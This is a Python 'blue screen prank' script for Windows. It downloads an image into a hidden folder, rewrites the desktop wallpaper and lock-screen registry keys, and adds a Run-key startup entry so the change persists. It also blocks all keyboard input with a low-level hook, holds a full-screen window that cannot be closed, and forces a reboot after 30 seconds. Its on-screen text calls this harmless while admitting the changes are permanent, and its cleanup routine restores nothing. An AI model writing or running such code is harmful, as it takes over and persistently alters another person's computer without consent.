import tkinter as tk
import os
import sys
import time
import ctypes
from ctypes import wintypes
import threading
import urllib.request
import winreg
import tempfile

HC_ACTION = 0
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

class BlueScreenPrank:
    def __init__(self):
        self.root = tk.Tk()
        self.countdown_seconds = 30
        self.hook = None
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.original_wallpaper = None
        self.prank_image_path = None
        self.change_backgrounds()
        self.setup_window()
        self.create_content()
        self.block_all_input()
    
    def setup_window(self):
        self.root.withdraw()
        self.root.overrideredirect(True)
        
        self.root.update_idletasks()
        width = self.root.winfo_screenwidth()
        height = self.root.winfo_screenheight()
        
        self.root.geometry(f'{width}x{height}+0+0')
        self.root.configure(bg='#0078d4')
        self.root.attributes('-topmost', True)
        
        try:
            self.root.state('zoomed')
        except:
            pass
            
        self.root.deiconify()
        self.root.lift()
        self.root.focus_force()
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        try:
            self.root.attributes('-disabled', False)
            self.root.resizable(False, False)
        except:
            pass
    
    def block_all_input(self):
        if sys.platform.startswith('win'):
            def low_level_keyboard_proc(nCode, wParam, lParam):
                if nCode >= 0:
                    return 1
                return self.user32.CallNextHookExW(self.hook, nCode, wParam, lParam)
            
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
            self.keyboard_proc = HOOKPROC(low_level_keyboard_proc)
            
            self.hook = self.user32.SetWindowsHookExW(
                WH_KEYBOARD_LL,
                self.keyboard_proc,
                self.kernel32.GetModuleHandleW(None),
                0
            )
            
            if not self.hook:
                print("Failed to install keyboard hook")
        
        self.root.bind('<Key>', lambda e: "break")
        self.root.bind('<KeyPress>', lambda e: "break")
        self.root.bind('<KeyRelease>', lambda e: "break")
        
        dangerous_keys = [
            '<Alt-F4>', '<Alt-Tab>', '<Control-c>', '<Control-q>', 
            '<Control-w>', '<Escape>', '<Control-Alt-Delete>',
            '<Super_L>', '<Super_R>', '<Menu>'
        ]
        
        for key in dangerous_keys:
            self.root.bind(key, lambda e: "break")
            self.root.bind_all(key, lambda e: "break")
    
    def change_backgrounds(self):
        try:
            self.download_prank_image()
            
            if self.prank_image_path:
                self.change_desktop_wallpaper()
                self.change_lock_screen()
                self.make_permanent_startup_entry()
                
        except Exception as e:
            print(f"Background change failed: {e}")
    
    def download_prank_image(self):
        try:
            url = "https://i.imgflip.com/772v1h.gif"
            
            documents_path = os.path.join(os.path.expanduser("~"), "Documents")
            prank_folder = os.path.join(documents_path, ".system_files")
            
            if not os.path.exists(prank_folder):
                os.makedirs(prank_folder)
                if sys.platform.startswith('win'):
                    ctypes.windll.kernel32.SetFileAttributesW(prank_folder, 2)
            
            self.prank_image_path = os.path.join(prank_folder, "background.gif")
            
            urllib.request.urlretrieve(url, self.prank_image_path)
            print(f"Downloaded prank image to: {self.prank_image_path}")
            
        except Exception as e:
            print(f"Failed to download image: {e}")
            self.prank_image_path = None
    
    def save_original_wallpaper(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Control Panel\Desktop", 
                               0, winreg.KEY_READ)
            self.original_wallpaper, _ = winreg.QueryValueEx(key, "Wallpaper")
            winreg.CloseKey(key)
            print(f"Original wallpaper: {self.original_wallpaper}")
        except Exception as e:
            print(f"Failed to get original wallpaper: {e}")
            self.original_wallpaper = None
    
    def change_desktop_wallpaper(self):
        try:
            SPI_SETDESKWALLPAPER = 20
            SPIF_UPDATEINIFILE = 1
            SPIF_SENDCHANGE = 2
            
            result = self.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER,
                0,
                self.prank_image_path,
                SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
            )
            
            if result:
                print("Desktop wallpaper changed successfully")
            else:
                print("Failed to change desktop wallpaper")
                
        except Exception as e:
            print(f"Error changing desktop wallpaper: {e}")
    
    def change_lock_screen(self):
        try:
            reg_locations = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Lock Screen\Creative"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Personalization")
            ]
            
            for hkey, reg_path in reg_locations:
                try:
                    key = winreg.CreateKey(hkey, reg_path)
                    
                    winreg.SetValueEx(key, "LockScreenImagePath", 0, winreg.REG_SZ, self.prank_image_path)
                    winreg.SetValueEx(key, "LockScreenImageUrl", 0, winreg.REG_SZ, self.prank_image_path)
                    winreg.SetValueEx(key, "LockScreenImageStatus", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(key, "NoLockScreenSlideshow", 0, winreg.REG_DWORD, 1)
                    winreg.SetValueEx(key, "NoChangingLockScreen", 0, winreg.REG_DWORD, 0)
                    
                    winreg.CloseKey(key)
                    print(f"Lock screen set in {reg_path}")
                    
                except Exception as e:
                    print(f"Failed to set lock screen in {reg_path}: {e}")
                    
        except Exception as e:
            print(f"Error changing lock screen: {e}")
    
    def make_permanent_startup_entry(self):
        try:
            startup_script_content = f'''
import ctypes
import sys
import os

def set_wallpaper():
    try:
        if os.path.exists(r"{self.prank_image_path}"):
            SPI_SETDESKWALLPAPER = 20
            SPIF_UPDATEINIFILE = 1
            SPIF_SENDCHANGE = 2
            
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER,
                0,
                r"{self.prank_image_path}",
                SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
            )
    except:
        pass

if __name__ == "__main__":
    set_wallpaper()
'''
            
            documents_path = os.path.join(os.path.expanduser("~"), "Documents")
            script_folder = os.path.join(documents_path, ".system_files")
            script_path = os.path.join(script_folder, "wallpaper_keeper.py")
            
            with open(script_path, 'w') as f:
                f.write(startup_script_content)
            
            startup_reg = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, startup_reg)
            
            python_path = sys.executable
            startup_command = f'"{python_path}" "{script_path}"'
            
            winreg.SetValueEx(key, "WallpaperKeeper", 0, winreg.REG_SZ, startup_command)
            winreg.CloseKey(key)
            
            print("Startup entry created to maintain wallpaper")
            
        except Exception as e:
            print(f"Failed to create startup entry: {e}")
    
    def restore_backgrounds(self):
        try:
            print("Backgrounds will remain changed permanently")
                    
        except Exception as e:
            print(f"Error in cleanup: {e}")
    
    def create_content(self):
        main_frame = tk.Frame(self.root, bg='#0078d4')
        main_frame.pack(fill='both', expand=True)
        
        center_frame = tk.Frame(main_frame, bg='#0078d4')
        center_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        prank_label = tk.Label(
            center_frame,
            text="You got pranked, restart the pc to revert changes",
            font=('Arial', 32, 'bold'),
            fg='white',
            bg='#0078d4',
            wraplength=800
        )
        prank_label.pack(pady=40)
        
        self.countdown_label = tk.Label(
            center_frame,
            text=f"System will restart in: {self.countdown_seconds} seconds",
            font=('Arial', 24),
            fg='yellow',
            bg='#0078d4'
        )
        self.countdown_label.pack(pady=20)
        
        error_text = """CRITICAL_PRANK_ERROR: 0x00000JOKE

Your system has been pranked! Don't worry, this is completely harmless.
The computer will restart automatically to complete the "prank cleanup process".

Error Details:
• PRANK_TYPE: Ultimate Friend Joke
• KEYBOARD_STATUS: Completely Disabled
• WALLPAPER_STATUS: PERMANENTLY Changed (surprise!)
• LOCK_SCREEN: Also PERMANENTLY Changed 
• STARTUP_ENTRY: Created to maintain changes
• DANGER_LEVEL: Zero
• DATA_LOSS: None
• ESCAPE_ROUTES: None Available

No escape possible - wait for automatic restart!
(Your backgrounds will stay changed even after restart! 😈)"""

        error_label = tk.Label(
            center_frame,
            text=error_text,
            font=('Courier', 12),
            fg='white',
            bg='#0078d4',
            justify='left'
        )
        error_label.pack(pady=30)
        
        self.root.after(1000, self.start_countdown)
    
    def start_countdown(self):
        if self.countdown_seconds > 0:
            self.countdown_label.config(
                text=f"System will restart in: {self.countdown_seconds} seconds"
            )
            self.countdown_seconds -= 1
            self.root.after(1000, self.start_countdown)
        else:
            self.restart_system()
    
    def restart_system(self):
        self.cleanup()
        try:
            if sys.platform.startswith('win'):
                os.system('shutdown /r /t 0')
            elif sys.platform.startswith('linux'):
                os.system('sudo reboot')
            elif sys.platform.startswith('darwin'):
                os.system('sudo reboot')
        except Exception:
            sys.exit()
    
    def cleanup(self):
        if self.hook and sys.platform.startswith('win'):
            try:
                self.user32.UnhookWindowsHookExW(self.hook)
                self.hook = None
            except:
                pass
    
    def run(self):
        def keep_on_top():
            try:
                self.root.lift()
                self.root.attributes('-topmost', True)
                self.root.focus_force()
                self.root.grab_set_global()
                self.root.after(10, keep_on_top)
            except:
                try:
                    self.root.grab_set()
                except:
                    pass
                self.root.after(10, keep_on_top)
        
        keep_on_top()
        
        try:
            self.root.mainloop()
        except:
            pass
        finally:
            self.restore_backgrounds()
            self.cleanup()

def main():
    prank = BlueScreenPrank()
    prank.run()

if __name__ == "__main__":
    main